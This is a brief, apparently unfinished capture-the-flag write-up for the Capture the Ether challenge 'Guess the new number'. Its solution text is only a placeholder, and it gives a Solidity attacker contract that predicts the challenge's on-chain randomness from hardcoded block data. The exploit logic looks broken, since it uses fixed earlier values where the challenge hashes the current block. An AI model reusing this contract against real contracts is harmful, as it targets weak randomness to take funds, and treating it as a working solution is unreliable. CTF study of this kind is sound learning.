# Guess the new number Capturetheether

## Goals

=> Guess the number which is now generated on-demand when a guess is made.

### Solution

- Placeholder

### Attacker Contract

```solidity
contract Hack {
    bytes32 public previousBlockHash =
        0xaf522205a688dbca66076fb9018238a615472ee70c411ecb9e882f77d874ad40;
    uint public previousTimestamp = 1678819296000;

    function guessNum() external view returns (uint8) {
        return
            uint8(
                keccak256(
                    abi.encodePacked(previousBlockHash, previousTimestamp)
                )
            );
    }
}
```
